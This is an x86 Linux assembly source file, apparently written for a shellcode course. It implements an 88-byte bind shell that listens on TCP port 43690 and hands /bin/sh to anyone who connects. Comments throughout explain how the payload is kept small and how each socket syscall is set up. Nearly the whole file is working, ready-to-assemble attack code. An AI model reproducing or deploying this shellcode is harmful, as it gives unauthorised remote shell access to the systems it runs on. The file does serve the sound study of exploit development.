; Filename: bind.nasm
; Author: Gitsnik SLAE-431
; Website:  http://dracyrys.com
;
; Purpose:
;	Bind an /bin/sh to a TCP port
;
; Shellcode is 88 bytes.
; Binds to tcp/43690
;
; Note:
;	Does not check for ADDRESS_IN_USE.
;	This means it will fail if you run
;	it too many times too close together.
;
; Writing Smaller Shellcode:
;
;	We save a few bytes by being creative with where
;	the numbers come from. Specifically, we only xor
;	EAX to begin with (and wipe EDX with the cdq)
;	for two reasons:
;	1) ECX will be overwritten with ESP on first use
;	2) It's cheaper to mov ebx, edx than it is to
;	   xor it and then increment. This makes use of
;	   mov not clearing the source (a useful thing)
;
;	Extra bits like the listen() call don't require
;	their second argument to be the same as the
;	source C file, where listen( sockfd, backlog )
;	exists, we just push sockfd and don't much
;	care for what is in backlog (actually the stack
;	address of sockaddr *).
;
;	Other refinements are simpler - if we look at
;	the listen() call again, we've already pushed
;	the data onto the stack with bind, so no point
;	re-pushing it. Likewise, ECX already contains
;	the pointer to our stack, so no need to re-set
;	it either.
;

global _start			

section .text
_start:
	xor eax, eax
	cdq

	;
	; sockfd = socket( 2, 1, 0 );
	;
	; Because we are using x86 not x86-64 all
	; these calls are done via the socketcall
	; interface.
	;
	; int socketcall( int call, *args );
	;
	mov al, 0x66

	push edx	; null
	inc edx
	mov ebx, edx	; EBX needs to be one for
			; the int 0x80 to work

	push edx	; 1
	inc edx
	push edx	; 2

	mov ecx, esp
	int 0x80

	;
	; bind
	;
	; int bind( sockfd, *addr, addrlen );
	;
	; stack is currently
	;	2
	;	1
	;	0
	;
	xchg eax, edx		; sockfd in edx for safe keeping
	add al, 0x64		; eax is now 0x02 (because of the
				; xchg) so add 64 to take it to 66

	pop ebx			; bind is 2
	pop ecx			; throw away 1
				; stack is now 0

	;
	; Replace 0xAAAA with whatever port you want. Remember to
	; put it in the little endian format.
	;
	push word 0xAAAA	; port, stack is now 0,AAAA
	push word bx		; PF_INET, stack is now 0,AAAA,2
	mov ecx, esp		; ecx points to sockaddr

	push byte 0x10		; addrlen
	push ecx		; pointer to sockaddr
	push edx		; sockfd
	mov ecx, esp		; new stack pointer.
	int 0x80

	;
	; listen
	;
	; int listen( sockfd, backlog );
	;
	; Stack currently contains 10,sockaddr,sockfd.
	; and ECX points to sockfd, so no need to push
	; other data, we use ECX for sockfd and don't care
	; about the backlog.
	;
	; Bind returned 0 into EAX
	;
	add al, 0x66		; 0 + 66 = 66 :)
	add bl, 0x02		; listen is 4
	int 0x80		; last push was sockfd, ecx points to it.

	;
	; accept
	;
	; clientfd = accept( sockfd, 0, 0 );
	;
	; stack is still useless.
	;
	inc ebx			; accept is 5

	; Note next two lines were previously here, but if EAX
	; is already null and we're doing a full mov into ecx
	; then emptying ecx is useless.
	;
	;add al, 0x66		; listen returns 0 on success too.
	;xor ecx, ecx
	;
	push eax		; 0
	push eax		; 0
	push edx		; sockfd
	add al, 0x66		; listen returns 0 on success
	mov ecx, esp		; pointer to arguments
	int 0x80

	xchg eax, ebx		; EBX is clientfd, eax is 5
	xor ecx, ecx
	add cl, 0x02

	dup:
		mov al, 0x3f	; syscall 63
		int 0x80
		dec cl
		jns dup		; if no sign on cl (e.g. > -1 ) loop

	;
	; execve
	;
	; execve( shell[0], 0, 0 );
	;
	; xor eax, eax has been commented out here because of the
	; way we do the dup2 loop. Specifically, from man 2 dup2
	;
	; RETURN VALUE
	;	On success, these system calls return the new descriptor.
	;	On error, -1 is returned, and errno is set appropriately.
	;
	; Our last call descriptor was for 0, so if no errors have
	; happened here, EAX is set to 0 - we can push this for our
	; null string on the stack
	;
	; Because of the stack previously we will also pop three items
	; off, giving us the already empty EAX as well as ECX, and EDX
	;

	pop edx			; Throw sockfd off the stack.
	pop edx			; execve( ,  , 0);
	pop ecx			; execve( , 0, 0);

	; xor eax, eax
	push eax
	push 0x68732f6e		; hs/n
	push 0x69622f2f		; ib//
	mov ebx, esp		; execve( ebx, 0, 0 );

	mov al, 0x0b		; syscall 11 (execve)
	
	int 0x80

section .data
